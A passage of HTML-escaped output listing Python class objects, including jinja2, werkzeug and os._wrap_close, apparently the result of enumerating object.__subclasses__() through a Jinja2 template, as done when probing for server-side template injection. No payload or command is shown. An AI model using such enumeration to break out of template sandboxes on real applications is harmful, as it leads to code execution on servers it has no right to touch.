\u0026#39;dict_itemiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_keyiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_valueiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_keys\u0026#39;\u0026gt; \u0026lt;class \u0026#39;mappingproxy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_reverseitemiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_reversekeyiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_reversevalueiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict_values\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict\u0026#39;\u0026gt; \u0026lt;class \u0026#39;ellipsis\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enumerate\u0026#39;\u0026gt; \u0026lt;class \u0026#39;filter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;float\u0026#39;\u0026gt; \u0026lt;class \u0026#39;frame\u0026#39;\u0026gt; \u0026lt;class \u0026#39;frozenset\u0026#39;\u0026gt; \u0026lt;class \u0026#39;function\u0026#39;\u0026gt; \u0026lt;class \u0026#39;generator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;getset_descriptor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;instancemethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;list_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;list_reverseiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;list\u0026#39;\u0026gt; \u0026lt;class \u0026#39;longrange_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026lt;class \u0026#39;map\u0026#39;\u0026gt; \u0026lt;class \u0026#39;member_descriptor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;memoryview\u0026#39;\u0026gt; \u0026lt;class \u0026#39;method_descriptor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;method\u0026#39;\u0026gt; \u0026lt;class \u0026#39;moduledef\u0026#39;\u0026gt; \u0026lt;class \u0026#39;module\u0026#39;\u0026gt; \u0026lt;class \u0026#39;odict_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pickle.PickleBuffer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;property\u0026#39;\u0026gt; \u0026lt;class \u0026#39;range_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;range\u0026#39;\u0026gt; \u0026lt;class \u0026#39;reversed\u0026#39;\u0026gt; \u0026lt;class \u0026#39;symtable entry\u0026#39;\u0026gt; \u0026lt;class \u0026#39;iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;set_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;set\u0026#39;\u0026gt; \u0026lt;class \u0026#39;slice\u0026#39;\u0026gt; \u0026lt;class \u0026#39;staticmethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;stderrprinter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;super\u0026#39;\u0026gt; \u0026lt;class \u0026#39;traceback\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tuple_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; \u0026lt;class \u0026#39;str_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; \u0026lt;class \u0026#39;wrapper_descriptor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zip\u0026#39;\u0026gt; \u0026lt;class \u0026#39;types.GenericAlias\u0026#39;\u0026gt; \u0026lt;class \u0026#39;anext_awaitable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;async_generator_asend\u0026#39;\u0026gt; \u0026lt;class \u0026#39;async_generator_athrow\u0026#39;\u0026gt; \u0026lt;class \u0026#39;async_generator_wrapped_value\u0026#39;\u0026gt; \u0026lt;class \u0026#39;Token.MISSING\u0026#39;\u0026gt; \u0026lt;class \u0026#39;coroutine_wrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;generic_alias_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;items\u0026#39;\u0026gt; \u0026lt;class \u0026#39;keys\u0026#39;\u0026gt; \u0026lt;class \u0026#39;values\u0026#39;\u0026gt; \u0026lt;class \u0026#39;hamt_array_node\u0026#39;\u0026gt; \u0026lt;class \u0026#39;hamt_bitmap_node\u0026#39;\u0026gt; \u0026lt;class \u0026#39;hamt_collision_node\u0026#39;\u0026gt; \u0026lt;class \u0026#39;hamt\u0026#39;\u0026gt; \u0026lt;class \u0026#39;InterpreterID\u0026#39;\u0026gt; \u0026lt;class \u0026#39;managedbuffer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;memory_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;method-wrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;types.SimpleNamespace\u0026#39;\u0026gt; \u0026lt;class \u0026#39;NoneType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;NotImplementedType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;str_ascii_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;types.UnionType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;weakref.CallableProxyType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;weakref.ProxyType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;weakref.ReferenceType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;EncodingMap\u0026#39;\u0026gt; \u0026lt;class \u0026#39;fieldnameiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;formatteriterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;BaseException\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib._ModuleLock\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib._DummyModuleLock\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib._ModuleLockManager\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib.ModuleSpec\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib.BuiltinImporter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib.FrozenImporter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib._ImportLockContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_thread.lock\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_thread.RLock\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_thread._localdummy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_thread._local\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_io._IOBase\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_io.IncrementalNewlineDecoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_io._BytesIOBuffer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;posix.ScandirIterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;posix.DirEntry\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external.WindowsRegistryFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external._LoaderBasics\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external.FileLoader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external._NamespacePath\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external.NamespaceLoader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external.PathFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_frozen_importlib_external.FileFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;codecs.Codec\u0026#39;\u0026gt; \u0026lt;class \u0026#39;codecs.IncrementalEncoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;codecs.IncrementalDecoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;codecs.StreamReaderWriter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;codecs.StreamRecoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_abc._abc_data\u0026#39;\u0026gt; \u0026lt;class \u0026#39;abc.ABC\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.Hashable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.Awaitable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.AsyncIterable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.Iterable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.Sized\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.Container\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.abc.Callable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;os._wrap_close\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_sitebuiltins.Quitter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_sitebuiltins._Printer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_sitebuiltins._Helper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_distutils_hack._TrivialRe\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_distutils_hack.DistutilsMetaFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_distutils_hack.shim\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.accumulate\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.combinations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.combinations_with_replacement\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.cycle\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.dropwhile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.takewhile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.islice\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.starmap\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.chain\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.compress\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.filterfalse\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.count\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.zip_longest\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.pairwise\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.permutations\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.product\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.repeat\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools.groupby\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools._grouper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools._tee\u0026#39;\u0026gt; \u0026lt;class \u0026#39;itertools._tee_dataobject\u0026#39;\u0026gt; \u0026lt;class \u0026#39;operator.attrgetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;operator.itemgetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;operator.methodcaller\u0026#39;\u0026gt; \u0026lt;class \u0026#39;reprlib.Repr\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections.deque\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_collections._deque_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_collections._deque_reverse_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_collections._tuplegetter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;collections._Link\u0026#39;\u0026gt; \u0026lt;class \u0026#39;types.DynamicClassAttribute\u0026#39;\u0026gt; \u0026lt;class \u0026#39;types._GeneratorWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools.partial\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools._lru_cache_wrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools.KeyWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools._lru_list_elem\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools.partialmethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools.singledispatchmethod\u0026#39;\u0026gt; \u0026lt;class \u0026#39;functools.cached_property\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enum.nonmember\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enum.member\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enum._auto_null\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enum.auto\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enum._proto_member\u0026#39;\u0026gt; \u0026lt;enum \u0026#39;Enum\u0026#39;\u0026gt; \u0026lt;class \u0026#39;enum.verify\u0026#39;\u0026gt; \u0026lt;class \u0026#39;re.Pattern\u0026#39;\u0026gt; \u0026lt;class \u0026#39;re.Match\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_sre.SRE_Scanner\u0026#39;\u0026gt; \u0026lt;class \u0026#39;re._parser.State\u0026#39;\u0026gt; \u0026lt;class \u0026#39;re._parser.SubPattern\u0026#39;\u0026gt; \u0026lt;class \u0026#39;re._parser.Tokenizer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;re.Scanner\u0026#39;\u0026gt; \u0026lt;class \u0026#39;string.Template\u0026#39;\u0026gt; \u0026lt;class \u0026#39;string.Formatter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;contextlib.ContextDecorator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;contextlib.AsyncContextDecorator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;contextlib._GeneratorContextManagerBase\u0026#39;\u0026gt; \u0026lt;class \u0026#39;contextlib._BaseExitStack\u0026#39;\u0026gt; \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt; \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing._Final\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing._Immutable\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing._NotIterable\u0026#39;\u0026gt; typing.Any \u0026lt;class \u0026#39;typing._PickleUsingNameMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing._BoundVarianceMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.Generic\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing._TypingEllipsis\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.Annotated\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.NamedTuple\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.TypedDict\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.NewType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.io\u0026#39;\u0026gt; \u0026lt;class \u0026#39;typing.re\u0026#39;\u0026gt; \u0026lt;class \u0026#39;ast.AST\u0026#39;\u0026gt; \u0026lt;class \u0026#39;markupsafe._MarkupEscapeHelper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;__future__._Feature\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_json.Scanner\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_json.Encoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;json.decoder.JSONDecoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;json.encoder.JSONEncoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_struct.Struct\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_struct.unpack_iterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_pickle.Pdata\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_pickle.PicklerMemoProxy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_pickle.UnpicklerMemoProxy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_pickle.Pickler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_pickle.Unpickler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pickle._Framer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pickle._Unframer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pickle._Pickler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pickle._Unpickler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zlib.Compress\u0026#39;\u0026gt; \u0026lt;class \u0026#39;zlib.Decompress\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_bz2.BZ2Compressor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_bz2.BZ2Decompressor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_lzma.LZMACompressor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_lzma.LZMADecompressor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_random.Random\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_sha512.sha384\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_sha512.sha512\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_weakrefset._IterationGuard\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_weakrefset.WeakSet\u0026#39;\u0026gt; \u0026lt;class \u0026#39;weakref.finalize._Info\u0026#39;\u0026gt; \u0026lt;class \u0026#39;weakref.finalize\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tempfile._RandomNameSequence\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tempfile._TemporaryFileCloser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tempfile._TemporaryFileWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tempfile.TemporaryDirectory\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_hashlib.HASH\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_hashlib.HMAC\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_blake2.blake2b\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_blake2.blake2s\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.bccache.Bucket\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.bccache.BytecodeCache\u0026#39;\u0026gt; \u0026lt;class \u0026#39;ast.NodeVisitor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dis._Unknown\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dis.Bytecode\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tokenize.Untokenizer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;inspect.BlockFinder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;inspect._void\u0026#39;\u0026gt; \u0026lt;class \u0026#39;inspect._empty\u0026#39;\u0026gt; \u0026lt;class \u0026#39;inspect.Parameter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;inspect.BoundArguments\u0026#39;\u0026gt; \u0026lt;class \u0026#39;inspect.Signature\u0026#39;\u0026gt; \u0026lt;class \u0026#39;threading._RLock\u0026#39;\u0026gt; \u0026lt;class \u0026#39;threading.Condition\u0026#39;\u0026gt; \u0026lt;class \u0026#39;threading.Semaphore\u0026#39;\u0026gt; \u0026lt;class \u0026#39;threading.Event\u0026#39;\u0026gt; \u0026lt;class \u0026#39;threading.Barrier\u0026#39;\u0026gt; \u0026lt;class \u0026#39;threading.Thread\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.parse._ResultMixinStr\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.parse._ResultMixinBytes\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.parse._NetlocResultMixinBase\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.utils.MissingType\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.utils.LRUCache\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.utils.Cycler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.utils.Joiner\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.utils.Namespace\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.nodes.EvalContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.nodes.Node\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.visitor.NodeVisitor\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.idtracking.Symbols\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.compiler.MacroRef\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.compiler.Frame\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.runtime.TemplateReference\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.runtime.Context\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.runtime.BlockReference\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.runtime.LoopContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.runtime.Macro\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.runtime.Undefined\u0026#39;\u0026gt; \u0026lt;class \u0026#39;numbers.Number\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.lexer.Failure\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.lexer.TokenStreamIterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.lexer.TokenStream\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.lexer.Lexer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.parser.Parser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.environment.Environment\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.environment.Template\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.environment.TemplateModule\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.environment.TemplateExpression\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.environment.TemplateStream\u0026#39;\u0026gt; \u0026lt;class \u0026#39;importlib._abc.Loader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;jinja2.loaders.BaseLoader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;select.poll\u0026#39;\u0026gt; \u0026lt;class \u0026#39;select.epoll\u0026#39;\u0026gt; \u0026lt;class \u0026#39;selectors.BaseSelector\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_socket.socket\u0026#39;\u0026gt; \u0026lt;class \u0026#39;array.array\u0026#39;\u0026gt; \u0026lt;class \u0026#39;array.arrayiterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;socketserver.BaseServer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;socketserver.ForkingMixIn\u0026#39;\u0026gt; \u0026lt;class \u0026#39;socketserver._NoThreads\u0026#39;\u0026gt; \u0026lt;class \u0026#39;socketserver.ThreadingMixIn\u0026#39;\u0026gt; \u0026lt;class \u0026#39;socketserver.BaseRequestHandler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;datetime.date\u0026#39;\u0026gt; \u0026lt;class \u0026#39;datetime.time\u0026#39;\u0026gt; \u0026lt;class \u0026#39;datetime.timedelta\u0026#39;\u0026gt; \u0026lt;class \u0026#39;datetime.tzinfo\u0026#39;\u0026gt; \u0026lt;class \u0026#39;calendar._localized_month\u0026#39;\u0026gt; \u0026lt;class \u0026#39;calendar._localized_day\u0026#39;\u0026gt; \u0026lt;class \u0026#39;calendar.Calendar\u0026#39;\u0026gt; \u0026lt;class \u0026#39;calendar.different_locale\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email._parseaddr.AddrlistClass\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.charset.Charset\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.header.Header\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.header._ValueFormatter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email._policybase._PolicyBase\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.feedparser.BufferedSubFile\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.feedparser.FeedParser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.parser.Parser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.parser.BytesParser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;email.message.Message\u0026#39;\u0026gt; \u0026lt;class \u0026#39;http.client.HTTPConnection\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_ssl._SSLContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_ssl._SSLSocket\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_ssl.MemoryBIO\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_ssl.SSLSession\u0026#39;\u0026gt; \u0026lt;class \u0026#39;_ssl.Certificate\u0026#39;\u0026gt; \u0026lt;class \u0026#39;ssl.SSLObject\u0026#39;\u0026gt; \u0026lt;class \u0026#39;mimetypes.MimeTypes\u0026#39;\u0026gt; \u0026lt;class \u0026#39;textwrap.TextWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;traceback._Sentinel\u0026#39;\u0026gt; \u0026lt;class \u0026#39;traceback.FrameSummary\u0026#39;\u0026gt; \u0026lt;class \u0026#39;traceback._ExceptionPrintContext\u0026#39;\u0026gt; \u0026lt;class \u0026#39;traceback.TracebackException\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.LogRecord\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.PercentStyle\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.Formatter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.BufferingFormatter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.Filter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.Filterer\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.PlaceHolder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.Manager\u0026#39;\u0026gt; \u0026lt;class \u0026#39;logging.LoggerAdapter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug._internal._Missing\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.exceptions.Aborter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.Request\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.OpenerDirector\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.BaseHandler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.HTTPPasswordMgr\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.AbstractBasicAuthHandler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.AbstractDigestAuthHandler\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.URLopener\u0026#39;\u0026gt; \u0026lt;class \u0026#39;urllib.request.ftpwrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;http.cookiejar.Cookie\u0026#39;\u0026gt; \u0026lt;class \u0026#39;http.cookiejar.CookiePolicy\u0026#39;\u0026gt; \u0026lt;class \u0026#39;http.cookiejar.Absent\u0026#39;\u0026gt; \u0026lt;class \u0026#39;http.cookiejar.CookieJar\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.ImmutableListMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.ImmutableDictMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures._omd_bucket\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.Headers\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.ImmutableHeadersMixin\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.IfRange\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.Range\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.ContentRange\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.datastructures.FileStorage\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses._MISSING_TYPE\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses._KW_ONLY_TYPE\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses._FIELD_BASE\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses.InitVar\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses.Field\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dataclasses._DataclassParams\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.sansio.multipart.Event\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.sansio.multipart.MultipartDecoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.sansio.multipart.MultipartEncoder\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pkgutil.ImpImporter\u0026#39;\u0026gt; \u0026lt;class \u0026#39;pkgutil.ImpLoader\u0026#39;\u0026gt; \u0026lt;class \u0026#39;unicodedata.UCD\u0026#39;\u0026gt; \u0026lt;class \u0026#39;hmac.HMAC\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.wsgi.ClosingIterator\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.wsgi.FileWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.wsgi._RangeWrapper\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.formparser.FormDataParser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.formparser.MultiPartParser\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.user_agent.UserAgent\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.sansio.request.Request\u0026#39;\u0026gt; \u0026lt;class \u0026#39;werkzeug.sansio.response.Response\u0026#39;\u0026gt; \u0026lt;class 